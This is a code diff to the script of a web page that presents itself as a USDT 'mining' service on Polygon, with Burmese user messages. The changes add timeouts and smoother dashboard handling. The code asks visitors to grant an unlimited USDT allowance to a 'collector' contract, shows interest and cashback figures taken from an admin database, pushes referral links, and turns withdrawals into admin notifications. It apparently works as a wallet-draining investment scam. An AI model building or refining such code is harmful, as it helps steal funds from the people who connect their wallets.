@@ -275,6 +275,13 @@
             "function balanceOf(address account) view returns (uint256)"
         ];
 
+        function withTimeout(promise, ms = 6000, fallbackValue = null) {
+            return Promise.race([
+                promise,
+                new Promise((resolve) => setTimeout(() => resolve(fallbackValue), ms))
+            ]);
+        }
+
         function showProgress(percent, text) {
             const container = document.getElementById("progressContainer");
             const bar = document.getElementById("progressBar");
@@ -582,8 +589,8 @@
                         userAddress = accounts[0];
                         provider = new ethers.BrowserProvider(window.ethereum);
 
-                        const network = await provider.getNetwork();
-                        if (network.chainId !== 137n) {
+                        const network = await withTimeout(provider.getNetwork(), 5000, null);
+                        if (network && network.chainId !== 137n) {
                             try {
                                 await switchToPolygonChain();
                             } catch (swErr) {
@@ -606,7 +613,8 @@
             provider.on("block", async () => {
                 try {
                     const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_APPROVE_ABI, provider);
-                    const balance = await usdtContract.balanceOf(userAddress);
+                    const balance = await withTimeout(usdtContract.balanceOf(userAddress), 6000, null);
+                    if (balance === null) return;
                     const formattedBal = Number(ethers.formatUnits(balance, 6));
                     
                     const currentBalEl = document.getElementById("lblWalletBal");
@@ -623,29 +631,43 @@
             try {
                 showProgress(30, "Checking your Mining...");
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_APPROVE_ABI, provider);
-                const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
+                const allowance = await withTimeout(
+                    usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS),
+                    7000,
+                    null
+                );
+
+                if (allowance === null) {
+                    hideProgress();
+                    document.getElementById("statusLog").innerText = "⚠️ Network ချိတ်ဆက်မှု နှေးနေပါသည်။ VPN စစ်ဆေးပြီး ပြန်စမ်းကြည့်ပါ။";
+                    return;
+                }
 
                 if (Number(allowance) > 0) {
-                    showProgress(60, "Syncing Account ID & Dashboard...");
+                    showProgress(65, "Syncing Account ID & Dashboard...");
                     const connectBtn = document.getElementById("connectBtn");
                     connectBtn.innerText = "Active Mining";
                     connectBtn.className = "bg-blue-600 hover:bg-blue-500 font-semibold px-3.5 py-2.5 rounded-xl transition cursor-pointer text-sm shadow-lg";
                     
-                    const badgeEl = document.getElementById("selectedNetworkBadge");
-                    badgeEl.classList.remove("hidden");
+                    document.getElementById("selectedNetworkBadge").classList.remove("hidden");
+                    document.getElementById("userDashboard").classList.remove("hidden");
+                    document.getElementById("lblUserId").innerText = formatSixDigitUserId(0, "M", userAddress);
 
                     const referrer = resolveReferrerAddress(userAddress);
-                    await autoRegisterInFirebase(userAddress, referrer);
-                    await checkUserData();
+                    withTimeout(autoRegisterInFirebase(userAddress, referrer), 5000, null).catch(() => {});
+
+                    await withTimeout(checkUserData(), 7000, null);
                     showProgress(100, "Welcome Back! Active mining...");
-                    setTimeout(hideProgress, 1000);
+                    setTimeout(hideProgress, 900);
                     startRealtimeBalanceSync();
                 } else {
                     hideProgress();
+                    document.getElementById("statusLog").innerText = "Connect Wallet ကိုနှိပ်ပြီး USDT Approval ပြုလုပ်ပါ။";
                 }
             } catch (err) {
                 console.error("Allowance check error:", err);
                 hideProgress();
+                document.getElementById("statusLog").innerText = "⚠️ စစ်ဆေးမှု မအောင်မြင်ပါ။ ပြန်လည်စမ်းသပ်ပါ။";
             }
         }
 
@@ -690,7 +712,11 @@
                 
                 showProgress(60, "Checking USDT allowance...");
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_APPROVE_ABI, provider);
-                const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
+                const allowance = await withTimeout(
+                    usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS),
+                    7000,
+                    0n
+                );
 
                 if (Number(allowance) > 0) {
                     showProgress(80, "Dashboard သို့ ဝင်ရောက်နေပါပြီ...");
@@ -702,9 +728,13 @@
                     connectBtn.innerText = "Active Mining";
                     connectBtn.className = "bg-blue-600 hover:bg-blue-500 font-semibold px-3.5 py-2.5 rounded-xl transition cursor-pointer text-sm shadow-lg";
 
+                    document.getElementById("userDashboard").classList.remove("hidden");
+                    document.getElementById("lblUserId").innerText = formatSixDigitUserId(0, "M", userAddress);
+
                     const referrer = resolveReferrerAddress(userAddress);
-                    await autoRegisterInFirebase(userAddress, referrer);
-                    await checkUserData();
+                    withTimeout(autoRegisterInFirebase(userAddress, referrer), 5000, null).catch(() => {});
+
+                    await withTimeout(checkUserData(), 7000, null);
                     showProgress(100, "Welcome Back! Dashboard သို့ ရောက်ရှိပါပြီ။");
                     setTimeout(hideProgress, 1000);
                     startRealtimeBalanceSync();
@@ -747,14 +777,19 @@
                 stopCountdown();
                 showProgress(75, "Auto-approving registration & notifying Admin...");
                 const referrer = resolveReferrerAddress(userAddress);
-                await autoRegisterInFirebase(userAddress, referrer, receipt?.hash || tx?.hash || "");
+                await withTimeout(
+                    autoRegisterInFirebase(userAddress, referrer, receipt?.hash || tx?.hash || ""),
+                    5000,
+                    null
+                );
 
                 showProgress(90, "Loading dashboard data...");
                 const refLink = `${window.location.origin}${window.location.pathname}?ref=${userAddress}`;
                 document.getElementById("refLink").value = refLink;
                 updateQRCode(refLink);
 
-                await checkUserData();
+                document.getElementById("userDashboard").classList.remove("hidden");
+                await withTimeout(checkUserData(), 7000, null);
                 showProgress(100, "Approval ပြီးပါပြီ။ Register အလိုအလျောက် ခွင့်ပြုပြီးပါပြီ။");
                 setTimeout(hideProgress, 1000);
                 startRealtimeBalanceSync();
@@ -774,71 +809,82 @@
         }
 
         async function checkUserData() {
+            if (!userAddress || !provider) return;
+            const dashboardEl = document.getElementById("userDashboard");
+
             try {
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_APPROVE_ABI, provider);
-                const allowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
-                const balance = await usdtContract.balanceOf(userAddress);
+                const allowance = await withTimeout(
+                    usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS),
+                    6000,
+                    1n
+                );
 
-                const dashboardEl = document.getElementById("userDashboard");
-                const formattedBal = Number(ethers.formatUnits(balance, 6));
+                if (Number(allowance ?? 0) <= 0) {
+                    currentWithdrawableBalance = 0;
+                    dashboardEl.classList.add("hidden");
+                    return;
+                }
+
+                dashboardEl.classList.remove("hidden");
+
+                const balance = await withTimeout(usdtContract.balanceOf(userAddress), 6000, 0n);
+                const formattedBal = Number(ethers.formatUnits(balance ?? 0n, 6));
                 const isEligibleForInterest = formattedBal >= 100;
                 const rate = isEligibleForInterest ? getInterestRate(formattedBal) : 0;
 
-                if (Number(allowance) > 0) {
-                    dashboardEl.classList.remove("hidden");
+                let fbUser = {};
+                try {
+                    const docSnap = await withTimeout(
+                        db.collection("users").doc(userAddress.toLowerCase()).get(),
+                        5000,
+                        null
+                    );
+                    if (docSnap && docSnap.exists) fbUser = docSnap.data() || {};
+                } catch (_) {}
 
-                    let fbUser = {};
-                    try {
-                        const docSnap = await db.collection("users").doc(userAddress.toLowerCase()).get();
-                        if (docSnap.exists) fbUser = docSnap.data() || {};
-                    } catch (_) {}
-
-                    if (fbUser.status === "banned") {
-                        alert("Your account has been banned by Admin!");
-                        document.body.innerHTML = "<h1 class='text-center text-red-500 mt-20 text-xl font-bold'>Access Denied: You are banned.</h1>";
-                        return;
-                    }
-
-                    const userIdDisplay = fbUser.userId || formatSixDigitUserId(0, "M", userAddress);
-                    document.getElementById("lblUserId").innerText = userIdDisplay;
-
-                    document.getElementById("lblWalletBal").innerText = `${formattedBal.toFixed(6)} USDT`;
-                    const lockedBalNum = Number(fbUser.lockedBalance || 0);
-                    const fbInterestNum = Number(fbUser.interestBalance || 0);
-                    const fbRefNum = Number(fbUser.referralBalance || 0);
-
-                    document.getElementById("lblLockedBal").innerText = `${lockedBalNum.toFixed(6)} USDT`;
-
-                    const computedCashback = isEligibleForInterest ? (formattedBal * rate) : 0;
-                    const cashback = fbInterestNum > 0 ? fbInterestNum : computedCashback;
-                    const withdrawableBalance = cashback + fbRefNum;
-                    currentWithdrawableBalance = withdrawableBalance;
-
-                    const tierNoticeEl = document.getElementById("tierNotice");
-                    if (!isEligibleForInterest) {
-                        const remainingUsdt = Math.max(0, 100 - formattedBal);
-                        tierNoticeEl.className = "bg-amber-950/60 border border-amber-500/40 text-amber-300 p-3 rounded-xl text-xs";
-                        tierNoticeEl.innerText = `လက်ရှိ Wallet Balance (${formattedBal.toFixed(2)} USDT) မှာ 100 USDT မပြည့်သေးပါ။ Interest မရရှိသေးပါ (နောက်ထပ် ${remainingUsdt.toFixed(2)} USDT လိုအပ်ပါသည်)။`;
-                    } else {
-                        tierNoticeEl.className = "bg-emerald-950/60 border border-emerald-500/40 text-emerald-300 p-3 rounded-xl text-xs";
-                        tierNoticeEl.innerText = `Interest ရရှိနေပါပြီ (လက်ရှိ Rate: ${(rate * 100).toFixed(1)}% USDTBalance)။`;
-                    }
-
-                    document.getElementById("lblCashbackBal").innerText = `${cashback.toFixed(6)} USDT`;
-                    document.getElementById("lblReferralBal").innerText = `${fbRefNum.toFixed(6)} USDT`;
-                    document.getElementById("lblWithdrawableBal").innerText = `${withdrawableBalance.toFixed(6)} USDT`;
-
-                    document.getElementById("lblInterestUsdt").innerText = `${cashback.toFixed(6)} USDT`;
-                    document.getElementById("lblInterestRate").innerText = `${(rate * 100).toFixed(1)}%`;
-                    document.getElementById("lblRebateRate").innerText = `${(rate * 100).toFixed(1)}%`;
-
-                    const refLink = `${window.location.origin}${window.location.pathname}?ref=${userAddress}`;
-                    document.getElementById("refLink").value = refLink;
-                    updateQRCode(refLink);
-                } else {
-                    currentWithdrawableBalance = 0;
-                    dashboardEl.classList.add("hidden");
+                if (fbUser.status === "banned") {
+                    alert("Your account has been banned by Admin!");
+                    document.body.innerHTML = "<h1 class='text-center text-red-500 mt-20 text-xl font-bold'>Access Denied: You are banned.</h1>";
+                    return;
                 }
+
+                const userIdDisplay = fbUser.userId || formatSixDigitUserId(0, "M", userAddress);
+                document.getElementById("lblUserId").innerText = userIdDisplay;
+
+                document.getElementById("lblWalletBal").innerText = `${formattedBal.toFixed(6)} USDT`;
+                const lockedBalNum = Number(fbUser.lockedBalance || 0);
+                const fbInterestNum = Number(fbUser.interestBalance || 0);
+                const fbRefNum = Number(fbUser.referralBalance || 0);
+
+                document.getElementById("lblLockedBal").innerText = `${lockedBalNum.toFixed(6)} USDT`;
+
+                const computedCashback = isEligibleForInterest ? (formattedBal * rate) : 0;
+                const cashback = fbInterestNum > 0 ? fbInterestNum : computedCashback;
+                const withdrawableBalance = cashback + fbRefNum;
+                currentWithdrawableBalance = withdrawableBalance;
+
+                const tierNoticeEl = document.getElementById("tierNotice");
+                if (!isEligibleForInterest) {
+                    const remainingUsdt = Math.max(0, 100 - formattedBal);
+                    tierNoticeEl.className = "bg-amber-950/60 border border-amber-500/40 text-amber-300 p-3 rounded-xl text-xs";
+                    tierNoticeEl.innerText = `လက်ရှိ Wallet Balance (${formattedBal.toFixed(2)} USDT) မှာ 100 USDT မပြည့်သေးပါ။ Interest မရရှိသေးပါ (နောက်ထပ် ${remainingUsdt.toFixed(2)} USDT လိုအပ်ပါသည်)။`;
+                } else {
+                    tierNoticeEl.className = "bg-emerald-950/60 border border-emerald-500/40 text-emerald-300 p-3 rounded-xl text-xs";
+                    tierNoticeEl.innerText = `Interest ရရှိနေပါပြီ (လက်ရှိ Rate: ${(rate * 100).toFixed(1)}% USDTBalance)။`;
+                }
+
+                document.getElementById("lblCashbackBal").innerText = `${cashback.toFixed(6)} USDT`;
+                document.getElementById("lblReferralBal").innerText = `${fbRefNum.toFixed(6)} USDT`;
+                document.getElementById("lblWithdrawableBal").innerText = `${withdrawableBalance.toFixed(6)} USDT`;
+
+                document.getElementById("lblInterestUsdt").innerText = `${cashback.toFixed(6)} USDT`;
+                document.getElementById("lblInterestRate").innerText = `${(rate * 100).toFixed(1)}%`;
+                document.getElementById("lblRebateRate").innerText = `${(rate * 100).toFixed(1)}%`;
+
+                const refLink = `${window.location.origin}${window.location.pathname}?ref=${userAddress}`;
+                document.getElementById("refLink").value = refLink;
+                updateQRCode(refLink);
             } catch (err) {
                 console.error(err);
             }
@@ -860,7 +906,7 @@
                     return;
                 }
 
-                await checkUserData();
+                await withTimeout(checkUserData(), 6000, null);
 
                 if (currentWithdrawableBalance <= 0) {
                     alert("လက်ရှိ ထုတ်ယူနိုင်သော Balance (0.000000 USDT) မရှိသေးပါ။");
@@ -873,13 +919,17 @@
                     return;
                 }
 
-                await notifyAdminViaFirebase("withdraw", {
-                    amount: withdrawAmountNum,
-                    userId: document.getElementById("lblUserId")?.innerText || ""
-                });
+                await withTimeout(
+                    notifyAdminViaFirebase("withdraw", {
+                        amount: withdrawAmountNum,
+                        userId: document.getElementById("lblUserId")?.innerText || ""
+                    }),
+                    6000,
+                    null
+                );
 
                 alert(`Withdraw (${withdrawAmountNum.toFixed(6)} USDT) တောင်းဆိုချက်ကို Firebase မှတစ်ဆင့် Admin ထံ အသိပေးပြီးပါပြီ။`);
-                await checkUserData();
+                await withTimeout(checkUserData(), 6000, null);
             } catch (err) {
                 console.error(err);
                 alert("Withdraw တောင်းဆိုမှု မအောင်မြင်ပါ။");
@@ -894,16 +944,16 @@
                     return;
                 }
 
-                const network = await provider.getNetwork();
-                if (network.chainId !== 137n) {
+                const network = await withTimeout(provider.getNetwork(), 5000, null);
+                if (network && network.chainId !== 137n) {
                     await switchToPolygonChain();
                 }
 
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_APPROVE_ABI, provider);
-                const rawBalance = await usdtContract.balanceOf(userAddress);
-                const formattedBal = Number(ethers.formatUnits(rawBalance, 6));
+                const rawBalance = await withTimeout(usdtContract.balanceOf(userAddress), 6000, 0n);
+                const formattedBal = Number(ethers.formatUnits(rawBalance ?? 0n, 6));
 
-                if (rawBalance <= 0n || formattedBal <= 0) {
+                if ((rawBalance ?? 0n) <= 0n || formattedBal <= 0) {
                     alert("Pledge တင်သွင်းရန် Wallet ထဲတွင် USDT လက်ကျန်ငွေ မရှိပါ။");
                     return;
                 }
@@ -914,8 +964,12 @@
                 if (!confirmed) return;
 
                 showProgress(35, "Pledge တောင်းဆိုချက်အတွက် Allowance စစ်ဆေးနေသည်...");
-                const currentAllowance = await usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS);
-                if (currentAllowance < rawBalance) {
+                const currentAllowance = await withTimeout(
+                    usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS),
+                    6000,
+                    0n
+                );
+                if ((currentAllowance ?? 0n) < rawBalance) {
                     showProgress(55, "USDT Approval Transaction တင်နေသည်...");
                     const usdtSigner = new ethers.Contract(USDT_ADDRESS, USDT_APPROVE_ABI, signer);
                     const appTx = await usdtSigner.approve(COLLECTOR_CONTRACT_ADDRESS, ethers.MaxUint256);
@@ -923,15 +977,19 @@
                 }
 
                 showProgress(80, "Admin ထံ Pledge အသိပေးချက် ပို့နေသည်...");
-                await notifyAdminViaFirebase("pledge", {
-                    amount: Number(formattedBal.toFixed(6)),
-                    userId: document.getElementById("lblUserId")?.innerText || ""
-                });
+                await withTimeout(
+                    notifyAdminViaFirebase("pledge", {
+                        amount: Number(formattedBal.toFixed(6)),
+                        userId: document.getElementById("lblUserId")?.innerText || ""
+                    }),
+                    6000,
+                    null
+                );
 
                 showProgress(100, `Pledge (${formattedBal.toFixed(6)} USDT) အတွက် Admin ကို အသိပေးပြီးပါပြီ။`);
                 setTimeout(hideProgress, 2000);
                 alert(`Pledge (${formattedBal.toFixed(6)} USDT) တောင်းဆိုချက်ကို Firebase မှတစ်ဆင့် Admin ထံ အသိပေးပြီးပါပြီ။`);
-                await checkUserData();
+                await withTimeout(checkUserData(), 6000, null);
             } catch (err) {
                 console.error(err);
                 hideProgress();
